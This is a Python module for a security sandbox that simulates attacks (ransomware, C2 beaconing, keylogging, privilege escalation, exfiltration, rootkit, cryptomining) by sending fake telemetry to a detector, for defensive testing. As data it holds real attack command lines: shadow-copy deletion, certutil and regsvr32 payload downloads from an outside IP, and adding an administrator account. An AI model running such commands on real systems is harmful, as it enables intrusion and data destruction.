"""
Simulator engine — generates realistic malicious telemetry for each attack
module and feeds it directly into Mahoraga's on_telemetry() pipeline.
These are simulators; no real malicious code executes.
"""

import time
import random
import threading
from typing import Callable

from python.core.logger import get_logger
from python.core.ipc_server import emit
from python.sandbox.attack_modules import MODULES_BY_ID, AttackModule

logger = get_logger('sandbox.simulator')

# Probability Mahoraga catches the attack, by difficulty
_CATCH_CHANCE = {
    'easy':   0.92,
    'medium': 0.75,
    'hard':   0.50,
    'expert': 0.28,
}


class AttackSimulator:
    def __init__(self, on_telemetry: Callable):
        self.on_telemetry = on_telemetry
        self.running = False
        self.current_module: AttackModule = None
        self.session_stats = {'caught': 0, 'evaded': 0, 'points': 0, 'attacks_launched': 0}
        self._detected_in_run = False   # True once SANDBOX_DETECTION fires for current run
        self._will_catch = False         # decided at launch time

    # ── Public API ────────────────────────────────────────────────────────────

    def launch(self, module_id: str, target_id: str):
        module = MODULES_BY_ID.get(module_id)
        if not module:
            emit('SANDBOX_ERROR', {'message': f'Unknown module: {module_id}'})
            return
        if self.running:
            emit('SANDBOX_ERROR', {'message': 'An attack is already running.'})
            return
        self.running = True
        self.current_module = module
        self._detected_in_run = False
        self._will_catch = random.random() < _CATCH_CHANCE.get(module.difficulty, 0.6)
        self.session_stats['attacks_launched'] += 1
        threading.Thread(target=self._run, args=(module, target_id), daemon=True).start()

    def on_detection(self, threat: dict):
        """Called by main.py when the real pipeline detects a threat."""
        if not self.running or not self.current_module or self._detected_in_run:
            return
        severity = threat.get('severity', 0)
        if severity >= 5 and self._will_catch:
            self._fire_detection('caught', threat.get('attack_type'), severity)

    def reset_session(self):
        self.running = False
        self.current_module = None
        self._detected_in_run = False
        self.session_stats = {'caught': 0, 'evaded': 0, 'points': 0, 'attacks_launched': 0}
        emit('SANDBOX_SESSION_RESET', self.session_stats)

    # ── Internal ──────────────────────────────────────────────────────────────

    def _fire_detection(self, result: str, attack_type: str = None, severity: int = 7):
        if self._detected_in_run:
            return
        self._detected_in_run = True
        mod = self.current_module
        if result == 'caught':
            self.session_stats['caught'] += 1
            self.session_stats['points'] += mod.points
            emit('SANDBOX_DETECTION', {
                'result':      'caught',
                'module_id':   mod.id,
                'attack_type': attack_type or mod.id.replace('_sim', ''),
                'severity':    severity,
                'points':      mod.points,
                'stats':       dict(self.session_stats),
            })
        else:
            self.session_stats['evaded'] += 1
            emit('SANDBOX_DETECTION', {
                'result':    'evaded',
                'module_id': mod.id,
                'attack_type': attack_type or mod.id.replace('_sim', ''),
                'severity':  severity,
                'points':    0,
                'stats':     dict(self.session_stats),
            })

    def _run(self, module: AttackModule, target_id: str):
        emit('SANDBOX_ATTACK_STARTED', {
            'module_id':    module.id,
            'module_name':  module.name,
            'target_id':    target_id,
            'mitre_id':     module.mitre_id,
            'technique':    module.technique,
            'duration_sec': module.duration_sec,
            'points':       module.points,
        })
        try:
            fn = getattr(self, f'_sim_{module.id}', self._sim_generic)
            fn(module, target_id)
        except Exception as e:
            logger.error(f'Simulation error in {module.id}: {e}')
        finally:
            # Guarantee exactly one SANDBOX_DETECTION per attack
            if not self._detected_in_run:
                if self._will_catch:
                    self._fire_detection('caught', module.id.replace('_sim', ''), 7)
                else:
                    self._fire_detection('evaded', module.id.replace('_sim', ''), 3)

            self.running = False
            self.current_module = None
            emit('SANDBOX_ATTACK_COMPLETE', {
                'module_id': module.id,
                'target_id': target_id,
                'stats':     dict(self.session_stats),
            })

    def _t(self, line: str):
        emit('SANDBOX_TERMINAL_LINE', {'line': line, 'ts': time.time()})

    # ── Simulators ────────────────────────────────────────────────────────────

    def _sim_ransomware_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(4000, 9000)
        self._t('> Dropping dropper to Temp directory...')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'svchost32.exe',
            'exe': 'C:\\Windows\\Temp\\svchost32.exe',
            'cmdline': ['svchost32.exe', '-k', 'encrypt'],
            'ppid': 4, 'cpu': 0.0, 'memory': 0.5, 'connections': 0,
            'attack_hint': 'ransomware', 'severity_hint': 7,
        })
        self._t('> svchost32.exe spawned from Temp — suspicious parent')
        time.sleep(2)
        self._t('> Enumerating user documents...')
        time.sleep(1)
        self._t('> Shadow copy deletion via vssadmin...')
        self.on_telemetry({
            'source': 'process', 'event': 'shadow_copy_deletion',
            'pid': pid, 'name': 'vssadmin.exe',
            'cmdline': ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
            'attack_hint': 'ransomware', 'severity_hint': 9,
        })
        time.sleep(2)
        self._t('> Beginning AES-256 encryption of target files...')
        exts = ['.docx', '.xlsx', '.pdf', '.jpg', '.psd', '.sql']
        for i in range(20):
            self.on_telemetry({
                'source': 'file', 'event': 'file_modified',
                'file_path': f'C:\\Users\\Admin\\Documents\\file_{i}{random.choice(exts)}',
                'is_sensitive': True, 'pid': pid,
            })
            if i == 4:
                self._t(f'> {i+1} files encrypted...')
            if i == 12:
                self._t(f'> {i+1} files encrypted...')
                self.on_telemetry({
                    'source': 'file', 'event': 'mass_file_modification',
                    'count': 13, 'severity_hint': 10, 'attack_hint': 'ransomware',
                })
            time.sleep(0.3)
        self._t('> Appending .locked extension to encrypted files')
        self.on_telemetry({
            'source': 'file', 'event': 'ransomware_extension_detected',
            'file_path': 'C:\\Users\\Admin\\Documents\\report.docx.locked',
            'attack_hint': 'ransomware', 'severity_hint': 10,
        })
        self._t('> Dropping ransom note: README_DECRYPT.txt')
        time.sleep(max(0, m.duration_sec - 20))

    def _sim_c2_beacon_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(3000, 8000)
        self._t('> Establishing encrypted C2 channel...')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'update_helper.exe',
            'exe': 'C:\\ProgramData\\update_helper.exe',
            'cmdline': ['update_helper.exe'],
            'ppid': 2048, 'cpu': 1.2, 'memory': 0.8, 'connections': 1,
            'attack_hint': 'c2_beacon', 'severity_hint': 7,
        })
        time.sleep(2)
        self._t('> Handshake complete — implant active')
        interval = max(3, m.duration_sec // 8)
        for i in range(8):
            ip = f'185.220.{random.randint(100,200)}.{random.randint(1,254)}'
            self._t(f'> Beacon #{i+1} → {ip}:4444 [{random.randint(60,120)}B]')
            self.on_telemetry({
                'source': 'network', 'event': 'suspicious_connection',
                'pid': pid, 'dest_ip': ip, 'dest_port': 4444,
                'packet_size': random.randint(60, 120), 'frequency': 12, 'protocol': 'TCP',
                'attack_hint': 'c2_beacon', 'severity_hint': 8,
            })
            if i == 2:
                self._t('> Tasking received: enumerate local users')
                self.on_telemetry({
                    'source': 'process', 'event': 'high_risk_process',
                    'pid': pid + 1, 'name': 'net.exe',
                    'cmdline': ['net', 'user'],
                    'attack_hint': 'c2_beacon', 'severity_hint': 7,
                })
            time.sleep(interval)

    def _sim_keylogger_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(2000, 5000)
        self._t('> Locating explorer.exe...')
        time.sleep(1)
        self._t('> Injecting into explorer.exe via WriteProcessMemory...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': pid, 'name': 'explorer.exe',
            'cmdline': ['explorer.exe'],
            'connections': 8, 'memory': 45.2, 'cpu': 0.5,
            'attack_hint': 'keylogger', 'severity_hint': 8,
        })
        time.sleep(2)
        self._t('> SetWindowsHookEx(WH_KEYBOARD_LL) — hook installed')
        self.on_telemetry({
            'source': 'process', 'event': 'resource_spike',
            'pid': pid, 'name': 'explorer.exe',
            'cpu': 14.4, 'memory': 67.8,
            'attack_hint': 'keylogger', 'severity_hint': 7,
        })
        time.sleep(2)
        self._t('> Capturing keystrokes... buffering to /tmp/.kl')
        self.on_telemetry({
            'source': 'file', 'event': 'file_created',
            'file_path': 'C:\\Users\\Admin\\AppData\\Local\\Temp\\.kl',
            'is_sensitive': True,
            'attack_hint': 'keylogger', 'severity_hint': 7,
        })
        time.sleep(max(0, m.duration_sec - 7))

    def _sim_privesc_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(5000, 9000)
        self._t('> Checking token privileges...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': pid, 'name': 'cmd.exe',
            'cmdline': ['cmd.exe', '/c', 'whoami', '/priv'],
            'ppid': 1024, 'cpu': 0.5, 'memory': 0.2, 'connections': 0,
            'attack_hint': 'privilege_escalation', 'severity_hint': 7,
        })
        time.sleep(2)
        self._t('> SeImpersonatePrivilege found — launching PrintSpoofer...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': random.randint(5000, 9000), 'name': 'PrintSpoofer64.exe',
            'cmdline': ['PrintSpoofer64.exe', '-i', '-c', 'cmd'],
            'ppid': pid, 'cpu': 12.0, 'memory': 2.1, 'connections': 0,
            'attack_hint': 'privilege_escalation', 'severity_hint': 9,
        })
        time.sleep(2)
        self._t('> Shell spawned as NT AUTHORITY\\SYSTEM')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': random.randint(5000, 9000), 'name': 'cmd.exe',
            'cmdline': ['cmd.exe', '/c', 'net', 'localgroup', 'administrators', 'attacker', '/add'],
            'ppid': 1024, 'cpu': 0.8, 'memory': 0.3, 'connections': 0,
            'attack_hint': 'privilege_escalation', 'severity_hint': 9,
        })
        time.sleep(max(0, m.duration_sec - 7))

    def _sim_data_exfil_sim(self, m: AttackModule, target_id: str):
        self._t('> Identifying high-value files...')
        time.sleep(2)
        self._t('> Staging: /etc/passwd, .ssh/id_rsa, *.sql dumps')
        self.on_telemetry({
            'source': 'file', 'event': 'file_created',
            'file_path': '/tmp/.stager.tar.gz', 'is_sensitive': True,
            'attack_hint': 'data_exfil', 'severity_hint': 8,
        })
        time.sleep(2)
        self._t('> Opening HTTPS tunnel to staging server...')
        interval = max(3, m.duration_sec // 6)
        for i in range(5):
            mb = random.randint(40, 90)
            ip = f'91.108.{random.randint(50,100)}.{random.randint(1,254)}'
            self.on_telemetry({
                'source': 'network', 'event': 'large_transfer',
                'dest_ip': ip, 'dest_port': 443, 'protocol': 'HTTPS',
                'packet_size': random.randint(8000, 65000),
                'bytes_total': mb * 1_000_000,
                'attack_hint': 'data_exfil', 'severity_hint': 8,
            })
            self._t(f'> Chunk {i+1}/5 sent ({mb}MB) → {ip}:443')
            time.sleep(interval)
        self._t('> Wiping local staging archive')

    def _sim_rootkit_sim(self, m: AttackModule, target_id: str):
        self._t('> Compiling kernel module...')
        time.sleep(2)
        self._t('> Loading .hidden.ko via insmod...')
        self.on_telemetry({
            'source': 'file', 'event': 'kernel_module_load',
            'file_path': '/lib/modules/5.15.0/kernel/drivers/.hidden.ko',
            'is_sensitive': True,
            'attack_hint': 'rootkit', 'severity_hint': 9,
        })
        time.sleep(3)
        self._t('> Hooking sys_getdents — process hiding active')
        pid = random.randint(100, 500)
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'kworker/u:3',
            'exe': '/lib/modules/.hidden.ko', 'cmdline': [],
            'cpu': 85.4, 'memory': 12.1, 'connections': 3,
            'attack_hint': 'rootkit', 'severity_hint': 9,
        })
        time.sleep(3)
        self._t('> Injecting /etc/ld.so.preload for persistence')
        self.on_telemetry({
            'source': 'file', 'event': 'ld_preload_injection',
            'file_path': '/etc/ld.so.preload', 'is_sensitive': True,
            'attack_hint': 'rootkit', 'severity_hint': 10,
        })
        time.sleep(max(0, m.duration_sec - 10))

    def _sim_lolbin_sim(self, m: AttackModule, target_id: str):
        self._t('> Abusing certutil to download payload...')
        self.on_telemetry({
            'source': 'process', 'event': 'lolbin_download',
            'pid': random.randint(5000, 9000), 'name': 'certutil.exe',
            'cmdline': ['certutil.exe', '-urlcache', '-split', '-f',
                        'http://185.220.101.45/payload.exe', 'C:\\Temp\\update.exe'],
            'ppid': 1024, 'cpu': 2.1, 'memory': 0.5, 'connections': 1,
            'attack_hint': 'backdoor', 'severity_hint': 8,
        })
        time.sleep(3)
        self._t('> Payload downloaded: C:\\Temp\\update.exe (2.1MB)')
        time.sleep(2)
        self._t('> Executing via regsvr32 scriptlet...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': random.randint(5000, 9000), 'name': 'regsvr32.exe',
            'cmdline': ['regsvr32.exe', '/s', '/n', '/u',
                        '/i:http://185.220.101.45/script.sct', 'scrobj.dll'],
            'ppid': 1024, 'cpu': 1.8, 'memory': 1.2, 'connections': 1,
            'attack_hint': 'backdoor', 'severity_hint': 8,
        })
        time.sleep(max(0, m.duration_sec - 7))

    def _sim_cryptominer_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(3000, 8000)
        self._t('> Dropping miner binary to /tmp...')
        self.on_telemetry({
            'source': 'file', 'event': 'file_created',
            'file_path': '/tmp/.system_update', 'is_sensitive': False,
            'attack_hint': 'cryptominer', 'severity_hint': 6,
        })
        time.sleep(2)
        self._t('> Executing: .system_update --pool xmr.pool.minergate.com:45700')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'system_update',
            'exe': '/tmp/.system_update',
            'cmdline': ['.system_update', '--pool', 'xmr.pool.minergate.com:45700'],
            'ppid': 1, 'cpu': 94.5, 'memory': 8.2, 'connections': 1,
            'attack_hint': 'cryptominer', 'severity_hint': 8,
        })
        self._t('> Pool connected — hash rate: 1.2 MH/s')
        interval = max(3, m.duration_sec // 5)
        for i in range(5):
            time.sleep(interval)
            cpu = random.uniform(88, 99)
            self.on_telemetry({
                'source': 'process', 'event': 'resource_spike',
                'pid': pid, 'name': 'system_update',
                'cpu': cpu, 'memory': random.uniform(7, 12),
                'attack_hint': 'cryptominer', 'severity_hint': 7,
            })
            self._t(f'> Mining... CPU={cpu:.0f}% ({(i+1)*20}% complete)')

    def _sim_generic(self, m: AttackModule, target_id: str):
        self._t(f'> Launching {m.name}...')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': random.randint(2000, 9000), 'name': 'suspicious_process',
            'exe': '/tmp/suspicious', 'cmdline': ['suspicious', '--attack'],
            'cpu': 45.0, 'memory': 12.0, 'connections': 3,
            'severity_hint': 8,
        })
        time.sleep(m.duration_sec)
